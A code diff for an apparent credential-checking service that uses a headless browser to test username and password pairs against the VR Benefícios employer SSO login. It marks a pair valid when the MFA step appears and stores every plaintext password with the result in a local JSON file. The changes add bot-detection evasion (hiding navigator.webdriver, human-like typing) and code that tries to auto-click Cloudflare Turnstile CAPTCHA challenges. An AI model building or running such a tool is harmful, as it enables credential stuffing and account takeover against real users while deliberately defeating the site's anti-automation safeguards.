@@ -19,7 +19,7 @@ app = FastAPI(title="VR SSO Auth Worker", version="2.0.0")
 DADOS_JSON = Path("dados.json")
 RESULTADO_JSON = Path("resultado.json")
 
-URL_LOGIN = "https://sso-acesso.vr.com.br/u/login?state=hKFo2SA5anVWVzM1WFlDUWwtcHZQMlFsZnJjZllJNktORjVXX6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNWelFtSWswQzJDSUJ3WWJzQ3ZnajlDUXpSMGJZSXF4o2NpZNkgSzRzQmJmVTVMM3RVcFFOT2NxWWc1OVA3TTI0S3ludUw"
+URL_LOGIN = "https://superportal-empregador.vr.com.br/"
 SELECTOR_USERNAME = "#username"
 SELECTOR_PASSWORD = "#password"
 SELECTOR_CONTINUAR = 'button[data-action-button-primary="true"]'
@@ -76,8 +76,23 @@ async def obter_browser():
         raise e
     return state.browser
 
+async def criar_contexto_stealth():
+    """Cria contexto isolado com evasão de fingerprint e atributos reais de navegador."""
+    await obter_browser()
+    context = await state.browser.new_context(
+        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+        viewport={"width": 1280, "height": 800},
+        locale="pt-BR"
+    )
+    await context.add_init_script("""
+        Object.defineProperty(navigator, 'webdriver', {
+            get: () => undefined
+        });
+    """)
+    return context
+
 async def preparar_pagina():
-    """Pré-carrega o formulário do SSO da VR com cookies e bundles em memória."""
+    """Pré-carrega o formulário do SSO da VR com cookies e bundles em memória gerando state dinâmico."""
     try:
         state.is_ready = False
         await obter_browser()
@@ -87,8 +102,8 @@ async def preparar_pagina():
             try:
                 logger.info("[WARM WORKER] Reciclando aba em memória...")
                 await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=25000)
-                await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=15000)
-                await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=15000)
+                await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=20000)
+                await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=20000)
                 state.is_ready = True
                 logger.info("[WARM WORKER] ✅ Aba 100% pronta e reciclada!")
                 return
@@ -99,19 +114,15 @@ async def preparar_pagina():
                 except Exception:
                     pass
 
-        # Cria novo contexto se necessário
+        # Cria novo contexto com stealth se necessário
         if not state.context:
-            state.context = await state.browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-                viewport={"width": 1280, "height": 800},
-                locale="pt-BR"
-            )
+            state.context = await criar_contexto_stealth()
 
         state.page = await state.context.new_page()
-        logger.info("[WARM WORKER] Carregando nova aba no SSO da VR...")
+        logger.info("[WARM WORKER] Carregando nova aba no SSO da VR com state dinâmico...")
         await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=30000)
-        await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=20000)
-        await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=20000)
+        await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=25000)
+        await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=25000)
 
         state.is_ready = True
         logger.info("[WARM WORKER] ✅ Página 100% pronta e pré-aquecida para autenticação instantânea!")
@@ -183,10 +194,11 @@ async def health():
         "is_ready": state.is_ready
     }
 
-def salvar_resultado_local(usuario: str, senha: str, valido: bool, mensagem: str, url_final: str = ""):
+def salvar_resultado_local(usuario: str, senha: str, valido: bool, mensagem: str, url_final: str = "", status_credencial: str = "invalido"):
     novo_log = {
         "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
         "valido": valido,
+        "status_credencial": status_credencial,
         "nome": usuario,
         "senha": senha,
         "mensagem": mensagem,
@@ -225,14 +237,29 @@ async def testar_credenciais(req: TesteRequest):
         logger.info(f"[WARM WORKER] Testando instantaneamente: {usuario}")
 
         try:
-            # 1. Preenchimento instantâneo (Aba já está aberta no formulário)
-            await page.fill(SELECTOR_USERNAME, usuario)
-            await page.fill(SELECTOR_PASSWORD, senha)
-            await page.click(SELECTOR_CONTINUAR)
+            # 1. Preenchimento com digitação natural para disparar listeners do React/Auth0
+            user_input = page.locator(SELECTOR_USERNAME).first
+            pass_input = page.locator(SELECTOR_PASSWORD).first
+
+            await user_input.click()
+            await user_input.fill("")
+            await user_input.type(usuario, delay=30)
+
+            await pass_input.click()
+            await pass_input.fill("")
+            await pass_input.type(senha, delay=30)
+
+            btn = page.locator(SELECTOR_CONTINUAR).first
+            if await btn.count() > 0:
+                await btn.click()
+            else:
+                await page.keyboard.press("Enter")
 
             # 2. Loop de detecção ativa (300ms)
             resultado_valido = None
+            status_credencial = "invalido"
             msg_resultado = ""
+            turnstile_detectado = False
 
             for _ in range(25): # até ~7.5s max
                 await asyncio.sleep(0.3)
@@ -241,6 +268,7 @@ async def testar_credenciais(req: TesteRequest):
                 # Se avançou para MFA -> Válido
                 if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                     resultado_valido = True
+                    status_credencial = "valido"
                     msg_resultado = "Login válido - etapa de código encontrada"
                     break
 
@@ -255,6 +283,7 @@ async def testar_credenciais(req: TesteRequest):
                                 txt = (await el.inner_text()).strip()
                                 if txt:
                                     resultado_valido = False
+                                    status_credencial = "invalido"
                                     msg_resultado = f"Credenciais incorretas na VR: {txt}"
                                     break
                     if resultado_valido is False:
@@ -262,19 +291,44 @@ async def testar_credenciais(req: TesteRequest):
                 except Exception:
                     pass
 
+                # Detecta e tenta auto-resolver Cloudflare Turnstile
+                try:
+                    for f in page.frames:
+                        if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
+                            turnstile_detectado = True
+                            try:
+                                box = f.locator('input[type="checkbox"], .ctp-checkbox-label, #challenge-stage, body').first
+                                if await box.count() > 0 and await box.is_visible():
+                                    await box.click()
+                            except Exception:
+                                pass
+                            break
+                    if not turnstile_detectado:
+                        cf_el = page.locator("iframe[src*='turnstile'], iframe[src*='challenges.cloudflare.com'], .cf-turnstile, #cf-turnstile")
+                        if await cf_el.count() > 0:
+                            turnstile_detectado = True
+                except Exception:
+                    pass
+
             url_final = page.url
             if resultado_valido is None:
                 if "mfa-email-challenge" in url_final or "mfa" in url_final.lower():
                     resultado_valido = True
+                    status_credencial = "valido"
                     msg_resultado = "Login válido - etapa de código encontrada"
+                elif turnstile_detectado:
+                    resultado_valido = False
+                    status_credencial = "bloqueio_captcha"
+                    msg_resultado = "Bloqueio Cloudflare Turnstile detectado no SSO da VR (verificação humana pendente)"
                 else:
                     resultado_valido = False
+                    status_credencial = "invalido"
                     msg_resultado = "Login inválido ou etapa de código não encontrada."
 
             duracao = asyncio.get_event_loop().time() - inicio
-            logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {'VÁLIDO' if resultado_valido else 'INVÁLIDO'} ({msg_resultado})")
+            logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {status_credencial.upper()} ({msg_resultado})")
 
-            salvar_resultado_local(usuario, senha, resultado_valido, msg_resultado, url_final)
+            salvar_resultado_local(usuario, senha, resultado_valido, msg_resultado, url_final, status_credencial=status_credencial)
 
             user_key = usuario.lower().strip()
             if resultado_valido:
@@ -291,14 +345,14 @@ async def testar_credenciais(req: TesteRequest):
                 state.context = None
                 asyncio.create_task(preparar_pagina())
             else:
-                # Recicla a aba normalmente em caso de senha inválida
+                # Recicla a aba normalmente em caso de senha inválida ou captcha
                 asyncio.create_task(preparar_pagina())
 
             return {
                 "success": True,
                 "usuario": usuario,
                 "valido": resultado_valido,
-                "status_credencial": "valido" if resultado_valido else "invalido",
+                "status_credencial": status_credencial,
                 "mfa_ativo": bool(resultado_valido),
                 "mensagem": msg_resultado,
                 "tempo_segundos": round(duracao, 2),
